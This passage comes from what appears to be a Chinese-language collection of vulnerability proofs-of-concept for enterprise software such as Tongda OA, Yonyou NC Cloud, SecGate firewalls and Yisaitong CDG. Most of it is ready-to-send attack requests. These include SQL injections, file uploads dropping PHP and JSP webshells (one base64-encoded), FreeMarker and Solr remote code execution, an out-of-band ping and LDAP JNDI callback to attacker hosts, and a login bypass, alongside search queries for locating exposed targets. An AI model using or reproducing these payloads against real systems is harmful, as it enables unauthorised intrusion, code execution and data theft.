&quot;https://****/ops/index.php?c=Reportguide&amp;a=checkrn&quot; --data &quot;checkname=123&amp;tagid=123&quot; -v3 --skip-waf --random-agent
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_81-通达oa-sql注入"><a href="#_81-通达oa-sql注入" class="header-anchor">#</a> 81.通达oa_sql注入</h2> <p>通达OA版本11.10之前存在SQL注入。</p> <p>通过时间延迟获取数据库信息</p> <p>验证POC1：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>验证POC2：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>
GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 192.168.232.137:8098
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46
Upgrade-Insecure-Requests: 1

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>本地环境的数据库为TD_OA</p> <p>在ASCII码中84代表的是 T</p> <h2 id="_82-通达oacve-2023-4166"><a href="#_82-通达oacve-2023-4166" class="header-anchor">#</a> 82.通达oaCVE-2023-4166</h2> <p><strong>影响范围</strong></p> <p>通达OA</p> <p>是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公平台</p> <p>本次范围：通达OA版本11.10之前</p> <p><strong>POC</strong></p> <p>post请求包</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 192.168.232.137:8098
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46
Upgrade-Insecure-Requests: 1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h2 id="_83-网神-secgate-3600-防火墙-obj-app-upfile-任意文件上传漏洞"><a href="#_83-网神-secgate-3600-防火墙-obj-app-upfile-任意文件上传漏洞" class="header-anchor">#</a> 83.网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞</h2> <p>漏洞描述：网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限
漏洞影响：网神 SecGate 3600 防火墙
网络测绘：fid=&quot;1Lh1LHi6yfkhiO83I59AYg==&quot;</p> <h2 id="漏洞复现"><a href="#漏洞复现" class="header-anchor">#</a> 漏洞复现</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /?g=obj_app_upfile HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 574
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;vulntest.php&quot;
Content-Type: text/plain

&lt;?php system(&quot;id&quot;);unlink(__FILE__);?&gt;

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;submit_post&quot;

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;__hash__&quot;

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>默认上传路径 /secgate/webui/attachements/ ， 访问 attachements/xxx.php 文件</p> <h2 id="_84-网神-secssl-3600安全接入网关系统-任意密码修改漏洞"><a href="#_84-网神-secssl-3600安全接入网关系统-任意密码修改漏洞" class="header-anchor">#</a> 84.网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /changepass.php?type=2 

Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={&quot;this_name&quot;:&quot;test&quot;,&quot;subAuthId&quot;:&quot;1&quot;}
old_pass=&amp;password=Test123!@&amp;repassword=Test123!@
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="_85-网御-acm-上网行为管理系统bottomframe-cgi-sql-注入漏洞"><a href="#_85-网御-acm-上网行为管理系统bottomframe-cgi-sql-注入漏洞" class="header-anchor">#</a> 85.网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_86-新开普智慧校园系统代码执行漏洞"><a href="#_86-新开普智慧校园系统代码执行漏洞" class="header-anchor">#</a> 86.新开普智慧校园系统代码执行漏洞</h2> <p>漏洞详情</p> <p>新开普智慧校园系统/service_transport/service.action接口处存在FreeMarker模板注入，攻击者可在未经身份认证的情况下，调用后台接口，构造恶意代码实现远程代码执行，最终可造成服务器失陷。</p> <p>路径存在则漏洞存在</p> <p>http://xxx.com/service_transport/service.action</p> <p>poc没回显</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /service_transport/service.action HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{
        &quot;command&quot;: &quot;GetFZinfo&quot;, 
        &quot;UnitCode&quot;: &quot;&lt;#assign ex = \&quot;freemarker.template.utility.Execute\&quot;?new()&gt;${ex(\&quot;cmd /c ping v0u26h.ceye.io\&quot;)}&quot;
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>写文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /service_transport/service.action HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{
        &quot;command&quot;: &quot;GetFZinfo&quot;, 
        &quot;UnitCode&quot;: &quot;&lt;#assign ex = \&quot;freemarker.template.utility.Execute\&quot;?new()&gt;${ex(\&quot;cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+ &gt;./webapps/ROOT/1.txt\&quot;)}&quot;
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>文件转换为jsp</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /service_transport/service.action HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{
        &quot;command&quot;: &quot;GetFZinfo&quot;, 
        &quot;UnitCode&quot;: &quot;&lt;#assign ex = \&quot;freemarker.template.utility.Execute\&quot;?new()&gt;${ex(\&quot;cmd /c certutil -decode ./webapps/ROOT/1.txt ./webapps/ROOT/1.jsp\&quot;)}&quot;
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h2 id="_87-亿赛通-uploadfilefromclientserviceforclient-任意文件上传漏洞"><a href="#_87-亿赛通-uploadfilefromclientserviceforclient-任意文件上传漏洞" class="header-anchor">#</a> 87.亿赛通 /UploadFileFromClientServiceForClient 任意文件上传漏洞</h2> <p>介绍</p> <p>亿某通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业校心重要数据资产,对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。</p> <p>近日监测发现某通电子文档安全管理系统任意文件上传漏洞，攻击者可通过发送特制请求来利用此漏洞，成功利用此漏洞可在目标系统上执行任意代码。</p> <p>对此，建议广大用户做好资产自查以及预防工作，以免遭受黑容攻击。</p> <p>影响范围</p> <p>其他未确认版本需自查</p> <p>exp</p> <p>直接bp发包即可，shell访问地址：https://x.x.x.x/tttT.jsp</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Content-Length: 1

shell内容

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="_88-亿赛通电子文档安全管理系统远程命令执行漏洞"><a href="#_88-亿赛通电子文档安全管理系统远程命令执行漏洞" class="header-anchor">#</a> 88.亿赛通电子文档安全管理系统远程命令执行漏洞</h2> <p>来源Matrix SEC</p> <p><strong>0x01 影响版本</strong></p> <p>亿赛通电子文档安全管理系统</p> <p><strong>0x02 网络测绘</strong></p> <p>fofa:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>app=&quot;亿赛通-电子文档安全管理系统&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>hunter:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>web.title=&quot;电子文档安全管理系统&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>POST /solr/flow/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1383.67 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
Content-Length: 78

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
    &lt;RDF&gt;
        &lt;item/&gt;
    &lt;/RDF&gt;

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h2 id="_89-用友-nc-cloud-jsinvoke-任意文件上传漏洞"><a href="#_89-用友-nc-cloud-jsinvoke-任意文件上传漏洞" class="header-anchor">#</a> 89.用友 NC Cloud jsinvoke 任意文件上传漏洞</h2> <p>漏洞描述</p> <p>用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限</p> <p>app=&quot;用友-NC-Cloud&quot;</p> <p>影响版本</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>NC63、NC633、NC65NC Cloud1903、NC Cloud1909NC Cloud2005、NC Cloud2105、NC Cloud2111
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>POC1</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
  &quot;serviceName&quot;: &quot;nc.itf.iufo.IBaseSPService&quot;,
  &quot;methodName&quot;: &quot;saveXStreamConfig&quot;,
  &quot;parameterTypes&quot;: [
    &quot;java.lang.Object&quot;,
    &quot;java.lang.String&quot;
  ],
  &quot;parameters&quot;: [
    &quot;${param.getClass().forName(param.error).newInstance().eval(param.cmd)}&quot;,
    &quot;webapps/nc_web/407.jsp&quot;
  ]
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>POC2</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host:
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded

{
  &quot;serviceName&quot;: &quot;nc.itf.iufo.IBaseSPService&quot;,
  &quot;methodName&quot;: &quot;saveXStreamConfig&quot;,
  &quot;parameterTypes&quot;: [
    &quot;java.lang.Object&quot;,
    &quot;java.lang.String&quot;
  ],
  &quot;parameters&quot;: [
    &quot;${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}&quot;,
    &quot;webapps/nc_web/301.jsp&quot;
  ]
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>POC3</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 192.168.0.11:8089
Content-Length: 249
Accept: */*

{&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;${param.getClass().forName(param.error).newInstance().eval(param.cmd)}&quot;,&quot;webapps/nc_web/1ndex.jsp&quot;]}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>访问1ndex.jsp，命令执行成功！</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>https://192.168.0.11:8089/1ndex.jsp?error=bsh.Interpreter&amp;cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream())
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>GET /1ndex.jsp?error=bsh.Interpreter&amp;cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) HTTP/1.1
Host: 192.168.0.11:8089
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h2 id="_90-用友grp-u8存在信息泄露"><a href="#_90-用友grp-u8存在信息泄露" class="header-anchor">#</a> 90.用友GRP-U8存在信息泄露</h2> <p>漏洞描述：用友U8系统存可直接访问log日志，泄露敏感信息</p> <p>批量扫描工具:https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E7%94%A8%E5%8F%8BGRP-U8</p> <p>GET /logs/info.log HTTP/1.1</p> <h2 id="_91-用友畅捷通-t注入"><a href="#_91-用友畅捷通-t注入" class="header-anchor">#</a> 91.用友畅捷通 T注入</h2> <p>sqlmap -u http://xx.xx.xx.xx/WebSer~1/create_site.php?site_id=1 --is-dba</p> <h2 id="_92-用友时空-ksoa-servletimagefield-文件-skeyvalue-参数sql-注入"><a href="#_92-用友时空-ksoa-servletimagefield-文件-skeyvalue-参数sql-注入" class="header-anchor">#</a> 92.用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET
/servlet/imagefield?key=readimage&amp;sImgname=password&amp;sTablename=bbs_admin&amp;sKeyname=id&amp;sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))-
-+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection:
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="_93-用友时空-ksoataskrequestservlet-sql注入漏洞"><a href="#_93-用友时空-ksoataskrequestservlet-sql注入漏洞" class="header-anchor">#</a> 93.用友时空 KSOATaskRequestServlet sql注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&amp;password=1,
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_94-用友时空ksoa-paybill-sql注入漏洞"><a href="#_94-用友时空ksoa-paybill-sql注入漏洞" class="header-anchor">#</a> 94.用友时空KSOA PayBill SQL注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /servlet/PayBill?caculate&amp;_rnd= HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 134
Accept-Encoding: gzip, deflate
Connection: close

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;name&gt;1&lt;/name&gt;&lt;name&gt;1'WAITFOR DELAY '00:00:03';-&lt;/name&gt;&lt;name&gt;1&lt;/name&gt;&lt;name&gt;102360&lt;/name&gt;&lt;/root&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="_95-用友文件服务器认证绕过"><a href="#_95-用友文件服务器认证绕过" class="header-anchor">#</a> 95.用友文件服务器认证绕过</h2> <p>资产搜索：</p> <p>app=&quot;用友-NC-Cloud&quot;   或者是app=&quot;用友-NC-Cloud&quot; &amp;&amp; server==&quot;Apache-Coyote/1.1&quot;</p> <p>POST数据包修改返回包 false改成ture就可以绕过登陆</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Thu, 10 Aug 2023 20:38:25 GMT
Connection: close
Content-Length: 17

{&quot;login&quot;:&quot;false&quot;}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="_96-用友移动管理系统-uploadapk-d"><a href="#_96-用友移动管理系统-uploadapk-d" class="header-anchor">#</a> 96.用友移动管理系统 uploadApk.d</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO 3
